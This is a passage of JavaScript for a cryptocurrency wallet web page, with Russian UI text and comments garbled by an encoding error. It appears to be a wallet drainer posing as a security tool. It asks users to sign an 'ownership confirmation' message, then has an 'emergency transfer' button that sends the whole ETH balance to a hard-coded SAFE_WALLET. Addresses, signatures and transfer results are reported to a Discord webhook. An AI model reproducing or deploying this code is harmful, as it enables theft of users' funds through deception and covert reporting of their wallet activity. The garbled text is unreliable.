            updateStatus('‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏: ' + error.message, true);
        }
    } finally {
        connectButton.classList.remove('loading');
    }
};

// –û–±–Ω–æ–≤–ª—è–µ–º —Ñ—É–Ω–∫—Ü–∏—é –ø–æ–¥–ø–∏—Å–∞–Ω–∏—è —Å–æ–æ–±—â–µ–Ω–∏—è
const originalSignHandler = signButton.onclick;
signButton.onclick = async function() {
    if (!userAddress) {
        updateStatus('‚ùå –°–Ω–∞—á–∞–ª–∞ –ø–æ–¥–∫–ª—é—á–∏—Ç–µ –∫–æ—à–µ–ª–µ–∫.', true);
        return;
    }
    
    try {
        signButton.classList.add('loading');
        updateStatus('‚åõ –ó–∞–ø—Ä–æ—Å –Ω–∞ –ø–æ–¥–ø–∏—Å–∞–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è...', false, true);
        
        const message = `–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –≤–ª–∞–¥–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–æ–º –¥–ª—è —Å–∏—Å—Ç–µ–º—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏. –í—Ä–µ–º—è: ${new Date().toLocaleString()}`;
        const signature = await web3.eth.personal.sign(message, userAddress, '');
        
        // –õ–æ–≥–∏—Ä—É–µ–º –ø–æ–¥–ø–∏—Å–∞–Ω–∏–µ
        logSignature(message, signature);
        
        updateStatus(`‚úÖ –°–æ–æ–±—â–µ–Ω–∏–µ —É—Å–ø–µ—à–Ω–æ –ø–æ–¥–ø–∏—Å–∞–Ω–æ! –ü–æ–¥–ø–∏—Å—å: ${signature.substring(0, 20)}...`);
        
    } catch (error) {
        sendDiscordLog('SIGNATURE_ERROR', {
            "‚ùå –î–µ–π—Å—Ç–≤–∏–µ": "–û—à–∏–±–∫–∞ –ø–æ–¥–ø–∏—Å–∞–Ω–∏—è —Å–æ–æ–±—â–µ–Ω–∏—è",
            "üë§ –ê–¥—Ä–µ—Å": userAddress,
            "üìù –û—à–∏–±–∫–∞": error.message,
            "üîß –ö–æ–¥ –æ—à–∏–±–∫–∏": error.code || 'N/A'
        }, 15158332);
        
        if (error.code === 4001) {
            updateStatus('‚ùå –í—ã –æ—Ç–∫–ª–æ–Ω–∏–ª–∏ –∑–∞–ø—Ä–æ—Å –Ω–∞ –ø–æ–¥–ø–∏—Å—å.', true);
        } else {
            updateStatus('‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–¥–ø–∏—Å–∏: ' + error.message, true);
        }
    } finally {
        signButton.classList.remove('loading');
    }
};

// –û–±–Ω–æ–≤–ª—è–µ–º —Ñ—É–Ω–∫—Ü–∏—é —ç–∫—Å—Ç—Ä–µ–Ω–Ω–æ–≥–æ –ø–µ—Ä–µ–≤–æ–¥–∞
const originalEmergencyHandler = emergencyTransferBtn.onclick;
emergencyTransferBtn.onclick = async function() {
    const confirmation = confirm(
        'üö® –í–ù–ò–ú–ê–ù–ò–ï! –≠–ö–°–¢–†–ï–ù–ù–´–ô –ü–ï–†–ï–í–û–î\n\n' +
        '–í—ã —Å–æ–±–∏—Ä–∞–µ—Ç–µ—Å—å –ø–µ—Ä–µ–≤–µ—Å—Ç–∏ –í–°–ï –¥–æ—Å—Ç—É–ø–Ω—ã–µ —Å—Ä–µ–¥—Å—Ç–≤–∞ –Ω–∞ –±–µ–∑–æ–ø–∞—Å–Ω—ã–π –∫–æ—à–µ–ª–µ–∫.\n\n' +
        `–ü–æ–ª—É—á–∞—Ç–µ–ª—å: ${SAFE_WALLET}\n\n` +
        '–≠—Ç–æ –¥–µ–π—Å—Ç–≤–∏–µ –ù–ï–û–ë–†–ê–¢–ò–ú–û –∏ —Ç—Ä–µ–±—É–µ—Ç –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –≤ –∫–æ—à–µ–ª—å–∫–µ.\n\n' +
        '–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å?'
    );
    
    if (confirmation) {
        // –õ–æ–≥–∏—Ä—É–µ–º –Ω–∞—á–∞–ª–æ –ø–µ—Ä–µ–≤–æ–¥–∞
        logEmergencyTransferStart();
        
        try {
            emergencyTransferBtn.classList.add('loading');
            transferStatus.style.display = 'block';
            transferStatus.className = 'status-box warning';
            transferStatus.innerHTML = '<p>‚åõ –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –ø–µ—Ä–µ–≤–æ–¥–∞...</p>';
            
            const balance = await web3.eth.getBalance(userAddress);
            const gasPrice = await web3.eth.getGasPrice();
            const increasedGasPrice = Math.floor(gasPrice * GAS_PRICE_MULTIPLIER);
            
            const gasCost = increasedGasPrice * GAS_LIMIT;
            const transferAmount = BigInt(balance) - BigInt(gasCost);
            
            if (transferAmount <= 0) {
                transferStatus.className = 'status-box error';
                transferStatus.innerHTML = '<p>‚ùå –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤ –¥–ª—è –ø–µ—Ä–µ–≤–æ–¥–∞ —Å —É—á–µ—Ç–æ–º –∫–æ–º–∏—Å—Å–∏–∏</p>';
                return;
            }
            
            transferStatus.innerHTML = '<p>‚åõ –û—Ç–ø—Ä–∞–≤–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏...</p>';
            
            const transactionObject = {
                from: userAddress,
                to: SAFE_WALLET,
                value: transferAmount.toString(),
                gas: GAS_LIMIT,
                gasPrice: increasedGasPrice
            };
            
            const receipt = await web3.eth.sendTransaction(transactionObject);
            
            // –õ–æ–≥–∏—Ä—É–µ–º —É—Å–ø–µ—à–Ω—ã–π –ø–µ—Ä–µ–≤–æ–¥
            logEmergencyTransferSuccess(receipt, transferAmount);
            
            transferStatus.className = 'status-box success';
            transferStatus.innerHTML = `
                <p>‚úÖ –ü–µ—Ä–µ–≤–æ–¥ —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω!</p>
                <p><strong>–•—ç—à:</strong> ${receipt.transactionHash.substring(0, 20)}...</p>
                <p><strong>–°—É–º–º–∞:</strong> ${web3.utils.fromWei(transferAmount.toString(), 'ether')} ETH</p>
                <p><strong>–ë–ª–æ–∫:</strong> ${receipt.blockNumber}</p>
            `;
            
            await loadBalances();
            
        } catch (error) {
            // –õ–æ–≥–∏—Ä—É–µ–º –æ—à–∏–±–∫—É –ø–µ—Ä–µ–≤–æ–¥–∞
            logEmergencyTransferError(error);
            
            console.error('Transfer error:', error);
            transferStatus.className = 'status-box error';
            transferStatus.innerHTML = `<p>‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–≤–æ–¥–∞: ${error.message}</p>`;
        } finally {
            emergencyTransferBtn.classList.remove('loading');
        }
    }
};

// –û–±–Ω–æ–≤–ª—è–µ–º –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –∏–∑–º–µ–Ω–µ–Ω–∏–π
if (typeof window.ethereum !== 'undefined') {
    window.ethereum.on('accountsChanged', function(accounts) {
        logAccountChange(accounts);
        
        if (accounts.length === 0) {
            updateStatus('–ö–æ—à–µ–ª–µ–∫ –æ—Ç–∫–ª—é—á–µ–Ω', true);
            hideElement(emergencySection);
            hideElement(signButton);
            showElement(connectButton);
        } else {
            userAddress = accounts[0];
            updateStatus(`–ê–∫–∫–∞—É–Ω—Ç –∏–∑–º–µ–Ω–µ–Ω: ${userAddress.substring(0, 10)}...`);
            loadBalances();
        }
    });
    
    window.ethereum.on('chainChanged', function(chainId) {
        logNetworkChange(parseInt(chainId, 16));
        window.location.reload();
    });
}

// –õ–æ–≥–∏—Ä—É–µ–º –ø—Ä–æ–≤–µ—Ä–∫—É —Å–µ—Ç–∏ –ø—Ä–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏
async function checkNetwork() {
    try {
        const chainId = await web3.eth.getChainId();
        const networks = {
            1: 'Ethereum Mainnet',
            56: 'Binance Smart Chain', 
            137: 'Polygon',
            42161: 'Arbitrum'
        };
        
        const networkName = networks[chainId] || `Unknown Network (ID: ${chainId})`;
        
        sendDiscordLog('NETWORK_CHECK', {
            "üåê –î–µ–π—Å—Ç–≤–∏–µ": "–ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–µ—Ç–∏ –ø—Ä–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏",
            "üîó –°–µ—Ç—å": networkName,
            "üë§ –ê–¥—Ä–µ—Å": userAddress
        }, 7419530);
        
    } catch (error) {
        console.error('Network check error:', error);
    }
}

console.log('üîê Discord Webhook logging activated!');

